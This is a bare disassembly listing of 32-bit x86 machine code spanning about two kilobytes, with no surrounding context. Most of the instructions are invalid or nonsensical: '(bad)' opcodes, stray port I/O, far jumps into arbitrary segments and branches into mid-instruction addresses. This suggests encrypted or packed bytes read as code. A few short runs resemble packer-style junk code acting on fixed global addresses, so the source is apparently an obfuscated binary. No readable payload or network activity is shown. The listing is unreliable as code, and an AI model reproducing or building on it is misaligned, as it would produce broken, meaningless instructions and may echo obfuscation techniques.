  40851f:	add    dh,BYTE PTR [ebx+0x7e]
  408522:	aam    0x92
  408524:	jmp    0x408513
  408526:	jno    0x40855b
  408528:	lock mov ch,0xdd
  40852b:	mov    dh,0xdc
  40852d:	fwait
  40852e:	xchg   ebp,eax
  40852f:	pop    es
  408530:	call   0x17c61c45
  408535:	or     ebp,ebp
  408537:	cli    
  408538:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408539:	mov    bl,BYTE PTR [eax+ecx*4+0x17614d64]
  408540:	inc    ebp
  408541:	ins    DWORD PTR es:[edi],dx
  408542:	jp     0x408523
  408544:	cdq    
  408545:	mov    esp,0x7953d7a0
  40854a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40854b:	mov    bl,0x89
  40854d:	and    ebp,DWORD PTR [edx-0x2c]
  408550:	inc    eax
  408551:	data16 (bad)
  408554:	iret   
  408555:	push   cs
  408556:	ins    DWORD PTR es:[edi],dx
  408557:	xchg   edi,edi
  408559:	ins    DWORD PTR es:[edi],dx
  40855a:	ret    0x24f0
  40855d:	mov    ds:0x52b100c5,eax
  408562:	sub    esp,esp
  408564:	stc    
  408565:	jl     0x40850e
  408567:	sub    al,0x6
  408569:	dec    eax
  40856a:	cmp    ah,BYTE PTR [edx+0x5004bcc3]
  408570:	fptan  
  408572:	add    ch,BYTE PTR [ebx+0x47]
  408575:	inc    edi
  408576:	mov    ecx,DWORD PTR [esp+eax*1+0x73337307]
  40857d:	mov    dl,0xcb
  40857f:	jg     0x408526
  408581:	or     al,0x5d
  408583:	mov    ah,0xbe
  408585:	inc    DWORD PTR [bx+si+0x3963]
  40858a:	icebp  
  40858b:	add    BYTE PTR [esi-0x3fc2a1d9],ch
  408591:	jns    0x408540
  408593:	and    BYTE PTR [edx],al
  408595:	mov    fs,WORD PTR [esi-0x1171f7cf]
  40859b:	fistp  DWORD PTR [ecx+0xa]
  40859e:	sub    BYTE PTR [edi],0xf4
  4085a1:	fistp  DWORD PTR [ecx]
  4085a3:	popa   
  4085a4:	mov    DWORD PTR ds:0xd4345999,esp
  4085aa:	xchg   ebx,eax
  4085ab:	sbb    BYTE PTR [eax+0x71],ch
  4085ae:	push   ebx
  4085af:	or     al,0x7c
  4085b1:	and    al,0xf1
  4085b3:	lahf   
  4085b4:	test   eax,0x7b68f033
  4085b9:	outs   dx,DWORD PTR ds:[esi]
  4085ba:	jp     0x40853e
  4085bc:	lock (bad) 
  4085be:	dec    esp
  4085bf:	loope  0x408577
  4085c1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4085c2:	xchg   BYTE PTR ds:0x524da0fb,dh
  4085c8:	test   BYTE PTR [edx+ebp*4],cl
  4085cb:	pusha  
  4085cc:	lods   al,BYTE PTR ds:[esi]
  4085cd:	setle  BYTE PTR [edi-0x5a]
  4085d1:	mov    cl,0x3e
  4085d3:	add    bl,BYTE PTR [ebx+0x119136d6]
  4085d9:	sahf   
  4085da:	fcmovbe st,st(2)
  4085dc:	sub    edx,0xffffff89
  4085df:	das    
  4085e0:	popa   
  4085e1:	idiv   BYTE PTR [esi+0x1c]
  4085e4:	dec    esp
  4085e5:	mov    ds,WORD PTR ds:0x1d92b4fc
  4085eb:	inc    esp
  4085ec:	mov    bh,0x1e
  4085ee:	jnp    0x40858d
  4085f0:	add    edi,0x286c2be6
  4085f6:	push   0xffffffec
  4085f8:	mov    dh,0xa
  4085fa:	cmp    al,0x4
  4085fc:	mov    ebx,0xf60aa34
  408601:	push   ss
  408602:	inc    eax
  408603:	outs   dx,BYTE PTR ds:[esi]
  408604:	inc    esi
  408605:	jae    0x4085c3
  408607:	fucomp st(5)
  408609:	cwde   
  40860a:	gs cmp eax,0x282bce93
  408610:	das    
  408611:	and    BYTE PTR [ecx+0x2c],dh
  408614:	jns    0x408614
  408616:	int    0x96
  408618:	and    eax,ebp
  40861a:	std    
  40861b:	adc    edx,DWORD PTR [ecx+ebp*1-0x33c26f70]
  408622:	int    0xfd
  408624:	clc    
  408625:	ret    
  408626:	dec    eax
  408627:	mov    dh,0xaa
  408629:	pop    ds
  40862a:	pop    ecx
  40862b:	arpl   dx,bx
  40862d:	dec    ebp
  40862e:	out    0xa8,al
  408630:	fwait
  408631:	cmp    cl,dh
  408633:	sub    al,0x84
  408635:	ror    DWORD PTR [ebx+0x5e],1
  408638:	int    0x30
  40863a:	add    BYTE PTR [edx],dl
  40863c:	cwde   
  40863d:	mov    DWORD PTR [ebx-0x4],edx
  408640:	xor    BYTE PTR cs:[ebp-0x49110266],al
  408647:	out    dx,eax
  408648:	clc    
  408649:	je     0x4085db
  40864b:	sbb    esi,DWORD PTR [ebx-0x75]
  40864e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40864f:	iret   
  408650:	cdq    
  408651:	add    dl,al
  408653:	ja     0x408646
  408655:	popa   
  408656:	xor    edx,DWORD PTR [ecx]
  408658:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408659:	pop    ds
  40865a:	inc    edx
  40865b:	cmp    eax,0x6622d740
  408660:	ins    DWORD PTR es:[edi],dx
  408661:	sbb    eax,0x29879070
  408666:	mov    esi,0xdb0f5c4d
  40866b:	lods   al,BYTE PTR ds:[esi]
  40866c:	add    BYTE PTR [ecx],ch
  40866e:	test   al,0x3d
  408670:	push   esi
  408671:	xor    eax,0x21c87bce
  408676:	pop    ebp
  408677:	ja     0x408643
  408679:	or     al,0x8f
  40867b:	retf   
  40867c:	inc    ebx
  40867d:	pop    ecx
  40867e:	ds daa 
  408680:	lods   eax,DWORD PTR ds:[esi]
  408681:	xlat   BYTE PTR ds:[ebx]
  408682:	push   es
  408683:	and    DWORD PTR [eax+ebx*1+0x5f14671a],esi
  40868a:	popa   
  40868b:	add    BYTE PTR [eax-0x6c],bl
  40868e:	mov    ds:0xa48119cf,al
  408693:	inc    edx
  408694:	mov    cl,BYTE PTR [ebx-0xc]
  408697:	pop    es
  408698:	add    ebp,DWORD PTR [ecx]
  40869a:	mov    ebx,0x8e12feb8
  40869f:	adc    DWORD PTR ds:0x4336e3,0x43367b
  4086a9:	mov    DWORD PTR [ebp-0xc],ebx
  4086ac:	sbb    DWORD PTR ds:0x43376f,0x4337a7
  4086b6:	jmp    0x4088fd
  4086bb:	pop    edi
  4086bc:	push   ebp
  4086bd:	jg     0x4086a0
  4086bf:	xor    eax,0xe8516171
  4086c4:	add    DWORD PTR [edx+0x12eb194a],ecx
  4086ca:	jp     0x24bf05a6
  4086d0:	jl     0x408750
  4086d2:	jle    0x408687
  4086d4:	mov    al,ds:0xc5229b84
  4086d9:	lds    edx,FWORD PTR [ebx+0x71]
  4086dc:	mov    ss,WORD PTR [ebx-0x258aeceb]
  4086e2:	(bad)  
  4086e3:	lods   al,BYTE PTR ds:[esi]
  4086e4:	int    0x9c
  4086e6:	(bad)  [eax]
  4086e8:	sbb    BYTE PTR [edx-0x57],ch
  4086eb:	xchg   edx,eax
  4086ec:	xchg   edi,eax
  4086ed:	pop    ds
  4086ee:	mov    eax,0x9defc280
  4086f3:	(bad)  
  4086f4:	out    dx,eax
  4086f5:	repnz shr DWORD PTR [ebx],1
  4086f8:	pop    ecx
  4086f9:	push   cs
  4086fa:	pop    eax
  4086fb:	adc    DWORD PTR [eax],ecx
  4086fd:	xchg   ebp,eax
  4086fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4086ff:	push   ss
  408700:	sub    DWORD PTR [ebx+0x1a73c709],0x3865831b
  40870a:	(bad)  [eax+edi*8+0x6a]
  40870e:	lahf   
  40870f:	addr16 mov esi,0x9628b36d
  408715:	test   al,0x87
  408717:	dec    edi
  408718:	pusha  
  408719:	pop    ebp
  40871a:	mov    eax,0xe6f7ed80
  40871f:	lea    edi,[edx]
  408721:	mov    esp,0x2bd9cd
  408726:	xchg   DWORD PTR [ecx-0x72f50736],ebp
  40872c:	add    ecx,DWORD PTR [ebx+ecx*2-0x55]
  408730:	popa   
  408731:	lds    esi,FWORD PTR [ebp+0x74f8dc83]
  408737:	push   esi
  408738:	loopne 0x4086c3
  40873a:	hlt    
  40873b:	ret    
  40873c:	(bad)  
  40873d:	xlat   BYTE PTR ds:[ebx]
  40873e:	sbb    BYTE PTR [ebx+0x2c],al
  408741:	mov    ch,0xad
  408743:	mov    ecx,0x602f012
  408748:	fstp   TBYTE PTR [ebx-0x192faf3f]
  40874e:	das    
  40874f:	push   es
  408750:	adc    dl,dl
  408752:	dec    edx
  408753:	call   0x9f1d:0xb6d127e
  40875a:	aaa    
  40875b:	jns    0x40878b
  40875d:	xor    bl,bl
  40875f:	pusha  
  408760:	sub    BYTE PTR [edx+0x67e01a4d],dl
  408766:	retf   0x9510
  408769:	jle    0x40871d
  40876b:	mov    bh,cl
  40876d:	adc    dl,bh
  40876f:	loop   0x4086f5
  408771:	sbb    ebp,edi
  408773:	push   0xee76da58
  408778:	mov    bh,0x51
  40877a:	mov    BYTE PTR [esi+0x1c],ah
  40877d:	test   al,0x24
  40877f:	sbb    eax,0x731c783b
  408784:	or     WORD PTR [edi+0x24987699],ax
  40878b:	iret   
  40878c:	sub    cl,bl
  40878e:	dec    ebx
  40878f:	retf   0x260e
  408792:	retf   
  408793:	dec    ebp
  408794:	rol    BYTE PTR es:[ebp+0x5a],0x19
  408799:	fsubr  QWORD PTR [edi+0x4ad531ef]
  40879f:	cmp    DWORD PTR [ecx-0x46eae3ad],ebx
  4087a5:	dec    esp
  4087a6:	das    
  4087a7:	out    0x2a,al
  4087a9:	sub    bh,BYTE PTR [ebx]
  4087ab:	cmp    bl,al
  4087ad:	sub    al,0x29
  4087af:	add    bl,ch
  4087b1:	and    edx,DWORD PTR [ebp-0x1cf35705]
  4087b7:	xlat   BYTE PTR ds:[ebx]
  4087b8:	sbb    edi,edi
  4087ba:	pop    edx
  4087bb:	push   0xffffff92
  4087bd:	leave  
  4087be:	loopne 0x40882e
  4087c0:	jnp    0x4087b9
  4087c2:	ins    BYTE PTR es:[edi],dx
  4087c3:	in     al,0x5b
  4087c5:	enter  0x3053,0xbd
  4087c9:	(bad)  
  4087cb:	test   eax,0x468f9119
  4087d0:	jae    0x4087c8
  4087d2:	lock fistp QWORD PTR [edi+edi*2-0x45]
  4087d7:	in     al,0x6a
  4087d9:	cmc    
  4087da:	mov    esp,0x45ae66db
  4087df:	xor    dl,ah
  4087e1:	mov    eax,0x9b65a913
  4087e6:	jne    0x4087e1
  4087e8:	cmp    eax,DWORD PTR [edx-0x6d27a5a]
  4087ee:	nop
  4087ef:	lea    esp,[eax]
  4087f1:	scas   eax,DWORD PTR es:[edi]
  4087f2:	in     al,0xc3
  4087f4:	out    0xc0,al
  4087f6:	and    BYTE PTR [ebx+0x67df031b],ch
  4087fc:	cmp    DWORD PTR [ebp-0x25],edx
  4087ff:	div    DWORD PTR [edx]
  408801:	mov    esi,0x4c0fb362
  408806:	call   0x10f890ed
  40880b:	add    al,0x6d
  40880d:	jo     0x40880d
  40880f:	test   BYTE PTR [eax+0x31],ah
  408812:	xchg   BYTE PTR [esi],dh
  408814:	xlat   BYTE PTR ds:[ebx]
  408815:	dec    ebp
  408816:	xchg   ecx,eax
  408817:	dec    esp
  408818:	pusha  
  408819:	aas    
  40881a:	mov    fs,WORD PTR [ecx+0x32540122]
  408820:	jl     0x408877
  408822:	mov    esi,0x999931c9
  408827:	push   es
  408828:	jg     0x40884d
  40882a:	les    esp,FWORD PTR [edi+0x1d]
  40882d:	push   ss
  40882e:	not    DWORD PTR [eax+0x269aa572]
  408834:	xchg   esi,eax
  408835:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408836:	(bad)  
  408837:	js     0x408802
  408839:	fadd   QWORD PTR [esi]
  40883b:	mov    ds:0xd8dc4fb1,eax
  408840:	ficomp WORD PTR [eax+0x2ebe9893]
  408846:	mov    ebx,0x88db8c35
  40884b:	push   edx
  40884c:	add    ebx,DWORD PTR [ebp-0x22]
  40884f:	mov    ch,0x83
  408851:	sub    DWORD PTR es:[eax],esp
  408854:	leave  
  408855:	(bad)  
  408856:	in     al,dx
  408857:	cld    
  408858:	(bad)  
  408859:	cs int 0x97
  40885c:	rcr    BYTE PTR [edx+0x6f],1
  40885f:	in     al,dx
  408860:	inc    esi
  408861:	xchg   ecx,eax
  408862:	dec    ebp
  408863:	stc    
  408864:	jl     0x4088d4
  408866:	lea    ebp,[ebx-0x80]
  408869:	dec    esi
  40886a:	mov    edx,0x12dbd334
  40886f:	cmc    
  408870:	xchg   edi,eax
  408871:	out    0xbc,al
  408873:	fsub   DWORD PTR [ebp-0x64]
  408876:	push   0x89327231
  40887b:	rol    DWORD PTR [eax-0x51],1
  40887e:	inc    eax
  40887f:	dec    ecx
  408880:	mov    al,0x5b
  408882:	in     al,0x61
  408884:	pop    ds
  408885:	push   cs
  408886:	call   0xe34b5f7f
  40888b:	pop    ebp
  40888c:	mov    edx,0x664facae
  408891:	stos   BYTE PTR es:[edi],al
  408892:	shl    BYTE PTR [edx+esi*8-0x1a],cl
  408896:	adc    BYTE PTR [ecx],al
  408898:	lods   eax,DWORD PTR ds:[esi]
  408899:	fild   QWORD PTR [ebx-0x2d]
  40889c:	stos   DWORD PTR es:[edi],eax
  40889d:	fs jp  0x408868
  4088a0:	xlat   BYTE PTR ds:[ebx]
  4088a1:	pop    edx
  4088a2:	or     dl,BYTE PTR [ebp+0x1deb5721]
  4088a8:	add    al,0x2a
  4088aa:	mov    DWORD PTR [ecx],edx
  4088ac:	xor    eax,0x89cbd65c
  4088b1:	jo     0x4088a7
  4088b3:	mov    ds,ebp
  4088b5:	test   ah,al
  4088b7:	aas    
  4088b8:	jno    0x408914
  4088ba:	mov    cl,0x5c
  4088bc:	jmp    0x97f8407
  4088c1:	or     DWORD PTR [ecx],ebx
  4088c3:	das    
  4088c4:	aas    
  4088c5:	fbstp  TBYTE PTR [edx+0x5]
  4088c8:	pop    edi
  4088c9:	adc    ebp,DWORD PTR ds:0xf6b363d5
  4088cf:	stos   DWORD PTR es:[edi],eax
  4088d0:	inc    edx
  4088d1:	cwde   
  4088d2:	mov    ch,0x20
  4088d4:	cmp    BYTE PTR [ebx],0xa8
  4088d7:	mov    BYTE PTR [ebx+0x459723a5],bh
  4088dd:	ret    
  4088de:	and    eax,0xcf0f32fd
  4088e3:	cmp    al,0x9f
  4088e5:	mov    bl,0xd3
  4088e7:	mov    dh,BYTE PTR [edi-0x39]
  4088ea:	into   
  4088eb:	or     al,0x80
  4088ed:	fld    QWORD PTR [eax*1-0x10f028cd]
  4088f4:	jb     0x408909
  4088f6:	xor    eax,DWORD PTR [eax]
  4088f8:	jo     0x4088c1
  4088fa:	fnstenv [ecx-0xf]
  4088fd:	mov    eax,DWORD PTR [eax]
  4088ff:	xor    DWORD PTR ds:0x4336e3,0x7c2a
  408909:	mov    cx,WORD PTR [ebp-0x4]
  40890d:	adc    DWORD PTR ds:0x43375b,0x67a8
  408917:	movzx  ecx,cx
  40891a:	xor    DWORD PTR ds:0x4336d3,0x1847
  408924:	add    ecx,DWORD PTR [eax]
  408926:	not    DWORD PTR ds:0x43369f
  40892c:	mov    DWORD PTR [ebp-0x18],ecx
  40892f:	mov    eax,DWORD PTR [ebp+0x8]
  408932:	or     DWORD PTR ds:0x4337a7,ebx
  408938:	mov    ecx,DWORD PTR [ebp-0x8]
  40893b:	xor    eax,esi
  40893d:	add    eax,edi
  40893f:	cmp    DWORD PTR [ecx],eax
  408941:	jne    0x408e5a
  408947:	dec    ecx
  408948:	mov    eax,DWORD PTR [ebp+0x8]
  40894b:	mov    ecx,DWORD PTR [ebp-0x18]
  40894e:	xor    eax,esi
  408950:	add    eax,edi
  408952:	cmp    DWORD PTR [ecx],eax
  408954:	jmp    0x408b9b
  408959:	stos   BYTE PTR es:[edi],al
  40895a:	adc    edx,esi
  40895c:	inc    ebx
  40895d:	jno    0x4089c0
  40895f:	stos   DWORD PTR es:[edi],eax
  408960:	icebp  
  408961:	jl     0x4089b5
  408963:	and    eax,0x6651682c
  408968:	stos   BYTE PTR es:[edi],al
  408969:	mov    al,0xd4
  40896b:	jle    0x4089eb
  40896d:	and    al,0x7c
  40896f:	jle    0x4089ef
  408971:	push   ecx
  408972:	cli    
  408973:	add    BYTE PTR [esi+0x2c7a80d4],cl
  408979:	mov    dh,0x5d
  40897b:	ss pop eax
  40897d:	mov    edi,0x9e391ce6
  408982:	clc    
  408983:	sar    BYTE PTR [ecx],0xd6
  408986:	mov    esp,0x43db7815
  40898b:	sbb    al,0xb
  40898d:	mov    esp,0xeb2d3e3b
  408992:	inc    esi
  408993:	(bad)  
  408994:	push   ebx
  408995:	xor    bl,BYTE PTR [edx-0x4e7fafad]
  40899b:	dec    esi
  40899c:	mov    edi,0x8157a58b
  4089a1:	ins    DWORD PTR es:[edi],dx
  4089a2:	add    edx,DWORD PTR [edx-0x487c960]
  4089a8:	pop    ds
  4089a9:	xchg   ebp,eax
  4089aa:	dec    ebx
  4089ab:	mov    cl,BYTE PTR [ebx+0x59]
  4089ae:	push   edx
  4089af:	aad    0xc8
  4089b1:	and    ah,BYTE PTR [eax+0x23d6ec12]
  4089b7:	jmp    0x4089bc
  4089b9:	xor    BYTE PTR [edx+ecx*2],dh
  4089bc:	sub    ebx,0xb6a8a4d8
  4089c2:	pusha  
  4089c3:	xor    al,0x96
  4089c5:	(bad)  
  4089c6:	xor    DWORD PTR [edx+0x4394aa6a],ecx
  4089cc:	jmp    0x408a48
  4089ce:	mov    eax,0x2442133c
  4089d3:	cli    
  4089d4:	call   0x7fe58ded
  4089d9:	in     al,0x7b
  4089db:	sub    esi,DWORD PTR [edx-0x77]
  4089de:	jns    0x4089ae
  4089e0:	xchg   edx,eax
  4089e1:	arpl   WORD PTR ds:0x20f48a17,si
  4089e7:	jg     0x408a66
  4089e9:	inc    ecx
  4089ea:	mov    edx,0xce7443b
  4089ef:	mov    eax,esi
  4089f1:	xchg   DWORD PTR [esi],ecx
  4089f3:	dec    esp
  4089f4:	pop    ebx
  4089f5:	bound  ebx,QWORD PTR cs:[ebx-0x7]
  4089f9:	xchg   edi,eax
  4089fa:	push   ebp
  4089fb:	push   0x58
  4089fd:	scas   al,BYTE PTR es:[edi]
  4089fe:	or     eax,DWORD PTR [edi-0x6c86c1e4]
  408a04:	mov    al,0x8a
  408a06:	xchg   DWORD PTR [ecx],ebx
  408a08:	scas   eax,DWORD PTR es:[edi]
  408a09:	adc    esi,ecx
  408a0b:	js     0x408a61
  408a0d:	in     al,dx
  408a0e:	jmp    0xc68aa319
  408a13:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408a14:	xchg   edx,eax
  408a15:	inc    ecx
  408a16:	in     eax,dx
  408a17:	mov    ebx,0xa0848caf
  408a1c:	pop    edi
  408a1d:	sub    eax,0xa8812d02
  408a22:	je     0x4089ea
  408a24:	mov    ecx,0xb5ac6e18
  408a29:	int3   
  408a2a:	dec    BYTE PTR [eax+ebx*2+0x54319163]
  408a31:	jp     0x408a1d
  408a33:	adc    eax,0x667700be
  408a38:	add    cl,BYTE PTR [ecx+0x1c2bb1d4]
  408a3e:	mov    eax,0x7e4330e9
  408a43:	pop    ds
  408a44:	test   al,cl
  408a46:	dec    esp
  408a47:	adc    ebp,DWORD PTR [esp+ebx*4]
  408a4a:	lds    esi,FWORD PTR [edi+0xa]
  408a4d:	mov    eax,0x11ce9d33
  408a52:	sub    BYTE PTR ds:0x5b2946a6,ah
  408a58:	imul   ecx,DWORD PTR [ebx+0x74],0xb
  408a5c:	in     eax,0x21
  408a5e:	(bad)  
  408a5f:	aas    
  408a60:	mov    edi,0x9432f2c7
  408a65:	mov    eax,ds:0xa55b0bab
  408a6a:	mov    al,0xf1
  408a6c:	addr16 add al,0x94
  408a6f:	push   edi
  408a70:	pusha  
  408a71:	jo     0x408a49
  408a73:	dec    ebx
  408a74:	mov    esp,ds
  408a76:	jmp    0x9bf2:0x594efb12
  408a7d:	fcmovbe st,st(7)
  408a7f:	fxch   st(2)
  408a81:	dec    esp
  408a82:	call   0x41bbf2e1
  408a87:	dec    ebp
  408a88:	lock sbb BYTE PTR [edi*2-0x43fe6ffc],bh
  408a90:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408a91:	int3   
  408a92:	loope  0x408a5b
  408a94:	not    BYTE PTR [edi-0x764ebf01]
  408a9a:	sbb    esi,DWORD PTR [edx+0x38048dec]
  408aa0:	test   ecx,eax
  408aa2:	fcomp  DWORD PTR [esi-0xce776c2]
  408aa8:	cld    
  408aa9:	or     BYTE PTR [ecx+eax*4],cl
  408aac:	pop    ebp
  408aad:	and    ebp,DWORD PTR [ebx+esi*4-0x6fd59f4b]
  408ab4:	jmp    0x5c50:0x5218e374
  408abb:	jns    0x408a6c
  408abd:	inc    ecx
  408abe:	add    dh,BYTE PTR [ebx]
  408ac0:	mov    al,ds:0xcabf12f1
  408ac5:	pop    ss
  408ac6:	stos   DWORD PTR es:[edi],eax
  408ac7:	(bad)  
  408ac8:	xor    ch,BYTE PTR [ecx*2-0x5d9a4bb]
  408acf:	int3   
  408ad0:	pusha  
  408ad1:	stc    
  408ad2:	push   esp
  408ad3:	ss jecxz 0x408aed
  408ad6:	push   edx
  408ad7:	sub    BYTE PTR [eax],0x4f
  408ada:	mov    cl,0x99
  408adc:	push   esp
  408add:	xchg   BYTE PTR [esi+0x6dd468d6],bl
  408ae3:	das    
  408ae4:	pop    ss
  408ae5:	mov    dl,0x43
  408ae7:	jmp    0xfc1:0x2ef95f1
  408aee:	adc    esp,DWORD PTR [edx+0x44]
  408af1:	out    0x37,eax
  408af3:	jp     0x408acd
  408af5:	jg     0x408ace
  408af7:	hlt    
  408af8:	aaa    
  408af9:	mov    ds:0x66d93f2f,al
  408afe:	fdivr  DWORD PTR [edx-0x9f02c5a]
  408b04:	mov    ebp,DWORD PTR [ebx]
  408b06:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408b07:	jmp    0x91e1:0xda4e3851
  408b0e:	sub    dl,BYTE PTR [ebp+0x73d4e68d]
  408b14:	add    DWORD PTR [ecx-0x1d675c8b],esi
  408b1a:	lds    ecx,FWORD PTR ds:0x1d19dcb5
  408b20:	call   0x17ce1d8e
  408b25:	mov    eax,ds:0xdbb74abe
  408b2a:	out    dx,al
  408b2b:	or     bl,ch
  408b2d:	shl    BYTE PTR [ebx],1
  408b2f:	jle    0x408add
  408b31:	dec    esi
  408b32:	out    0xa5,eax
  408b34:	sahf   
  408b35:	fs pop ds
  408b37:	sbb    ch,BYTE PTR [edx-0x68]
  408b3a:	aam    0xf6
  408b3c:	sub    bh,BYTE PTR [ecx+0x58]
  408b3f:	idiv   DWORD PTR [ebx-0x51]
  408b42:	pop    edi
  408b43:	inc    esp
  408b44:	scas   al,BYTE PTR es:[edi]
  408b45:	lea    ebp,[esi]
  408b47:	adc    BYTE PTR [ecx+0x48592555],ah
  408b4d:	popa   
  408b4e:	add    DWORD PTR [eax+0x4f],edx
  408b51:	pop    eax
  408b52:	in     eax,0xbe
  408b54:	or     DWORD PTR [ebx+eax*2+0x23394b71],eax
  408b5b:	call   0x2577:0xcba5d0ec
  408b62:	stos   BYTE PTR es:[edi],al
  408b63:	imul   ecx,DWORD PTR [edx-0x6594fc2f],0x5b753437
  408b6d:	(bad)  
  408b6e:	xor    dh,BYTE PTR [ebp-0x24]
  408b71:	xchg   BYTE PTR [ecx+eiz*2+0x601b98c9],bl
  408b78:	arpl   WORD PTR [edi+0x16],sp
  408b7b:	mov    dh,0x71
  408b7d:	sbb    al,0xe4
  408b7f:	loopne 0x408bfc
  408b81:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408b82:	and    bh,BYTE PTR [eax+eiz*8]
  408b85:	add    dl,BYTE PTR [esi+eiz*2-0x26]
  408b89:	test   eax,0x1c101eba
  408b8e:	scas   al,BYTE PTR es:[edi]
  408b8f:	mov    ebx,esi
  408b91:	sub    al,0xfb
  408b93:	fild   WORD PTR [ecx]
  408b95:	popf   
  408b96:	adc    DWORD PTR ds:0xf9aa929,ecx
  408b9c:	test   DWORD PTR ds:0x8b000000,ebx
  408ba2:	inc    ebp
  408ba3:	or     BYTE PTR [ebx-0x39cc0fb3],cl
  408ba9:	add    eax,edi
  408bab:	mov    DWORD PTR [ecx],eax
  408bad:	mov    eax,DWORD PTR [ebp-0x10]
  408bb0:	mov    ecx,DWORD PTR [ebp+0x10]
  408bb3:	xor    ecx,esi
  408bb5:	mov    edx,0xffcd8d65
  408bba:	sub    edx,ecx
  408bbc:	add    DWORD PTR [eax],edx
  408bbe:	mov    eax,ds:0x413c08
  408bc3:	mov    eax,DWORD PTR [eax]
  408bc5:	mov    cx,WORD PTR [ebp-0x4]
  408bc9:	movzx  ecx,cx
  408bcc:	add    ecx,DWORD PTR [eax]
  408bce:	mov    DWORD PTR [ebp-0x18],ecx
  408bd1:	mov    eax,DWORD PTR [ebp+0xc]
  408bd4:	mov    ecx,DWORD PTR [ebp+0xc]
  408bd7:	xor    eax,esi
  408bd9:	add    eax,eax
  408bdb:	xor    ecx,esi
  408bdd:	sub    ecx,eax
  408bdf:	jmp    0x408e26
  408be4:	xchg   ebx,eax
  408be5:	or     BYTE PTR [esi+0x73709572],cl
  408beb:	jmp    0x946e656d
  408bf0:	test   DWORD PTR [ecx+0x34],0x7ed2663c
  408bf7:	jle    0x408c1d
  408bf9:	jl     0x408c79
  408bfb:	jle    0x408bb4
  408bfd:	imul   ebx,DWORD PTR [ecx+0x15],0xffffffba
  408c01:	enter  0x93d9,0x76
  408c05:	imul   eax,DWORD PTR [eax+0x62],0x65
  408c09:	frstor [ebp-0x34]
  408c0c:	mov    dl,0xd1
  408c0e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408c0f:	mov    ah,0x93
  408c11:	mov    ds:0x61ab3912,eax
  408c16:	add    eax,edx
  408c18:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  408c1a:	xor    BYTE PTR [edx+0x58],dh
  408c1d:	inc    edi
  408c1e:	push   esp
  408c1f:	xchg   esp,eax
  408c20:	imul   edi,ecx,0xceb601b6
  408c26:	retf   
  408c27:	outs   dx,DWORD PTR ds:[esi]
  408c28:	xor    esp,DWORD PTR [edi-0x4e]
  408c2b:	dec    esi
  408c2c:	aaa    
  408c2d:	mov    WORD PTR [eax+ebp*2+0x47],ss
  408c31:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408c32:	inc    ebp
  408c33:	in     eax,0x50
  408c35:	inc    ebx
  408c36:	stos   BYTE PTR es:[edi],al
  408c37:	pop    es
  408c38:	add    eax,0xf081c480
  408c3d:	(bad)  
  408c3e:	shl    BYTE PTR [eax],cl
  408c40:	mov    esi,0x24038064
  408c45:	shl    DWORD PTR ds:0xfdd4b2df,1
  408c4b:	aaa    
  408c4c:	inc    ebx
  408c4d:	xor    DWORD PTR [ebp+0x37],edi
  408c50:	shl    DWORD PTR [esi],cl
  408c52:	pushw  0xffbb
  408c55:	pop    ebp
  408c56:	xchg   ecx,eax
  408c57:	sub    DWORD PTR [ebx+0x7f9d4ca1],ebp
  408c5d:	inc    edx
  408c5e:	mov    esp,DWORD PTR [ecx-0x78]
  408c61:	xor    ecx,DWORD PTR [ebp-0x1a]
  408c64:	sub    DWORD PTR [edx-0x1f],edi
  408c67:	lods   eax,DWORD PTR ds:[esi]
  408c68:	mov    edi,0x5a13376b
  408c6d:	xor    ebp,DWORD PTR [esi+0x7a]
  408c70:	jge    0x408c24
  408c72:	addr16 adc eax,0x74fde984
  408c78:	add    ebp,0x90f560cb
  408c7e:	cmp    dh,BYTE PTR ds:0x5b7f8eed
  408c84:	sub    BYTE PTR [ebx+0x24],bl
  408c87:	ins    DWORD PTR es:[edi],dx
  408c88:	lea    ebx,[ebx+0x41]
  408c8b:	xor    esp,DWORD PTR [eax+0x1a2cde3a]
  408c91:	inc    esp
  408c92:	cmp    al,0xc8
  408c94:	popf   
  408c95:	jae    0x408c92
  408c97:	mov    ss,WORD PTR [ecx-0x1d]
  408c9a:	or     eax,0x60737a00
  408c9f:	stos   DWORD PTR es:[edi],eax
  408ca0:	xchg   esi,esp
  408ca2:	ins    DWORD PTR es:[edi],dx
  408ca3:	cli    
  408ca4:	int3   
  408ca5:	sub    al,0x41
  408ca7:	(bad)  
  408ca8:	je     0x408c69
  408caa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408cab:	repnz fwait
  408cad:	popf   
  408cae:	std    
  408caf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408cb0:	out    0xd3,eax
  408cb2:	jb     0x408cce
  408cb4:	repz sahf 
  408cb6:	jns    0x408ca8
  408cb8:	js     0x408ca6
  408cba:	jecxz  0x408d11
  408cbc:	sti    
  408cbd:	outs   dx,DWORD PTR ds:[esi]
  408cbe:	aam    0x39
  408cc0:	cmp    al,0xe2
  408cc2:	stc    
  408cc3:	xor    ebx,DWORD PTR [edi-0x73]
  408cc6:	push   cs
  408cc7:	pop    es
  408cc8:	in     eax,dx
  408cc9:	push   0x8681c6b0
  408cce:	sbb    DWORD PTR [ebx],eax
  408cd0:	imul   esi,ecx,0x5b8cf397
  408cd6:	pop    ecx
  408cd7:	(bad)  
  408cd8:	mov    esi,0x927e558f
  408cdd:	xchg   ebx,eax
  408cde:	lds    edi,FWORD PTR [eax]
  408ce0:	dec    ebp
  408ce1:	cmp    al,0x9b
  408ce3:	test   DWORD PTR [esi],edx
  408ce5:	scas   al,BYTE PTR es:[edi]
  408ce6:	lock pop ebx
  408ce8:	push   es
  408ce9:	(bad)  
  408cec:	out    dx,al
  408ced:	outs   dx,DWORD PTR ds:[esi]
  408cee:	je     0x408d61
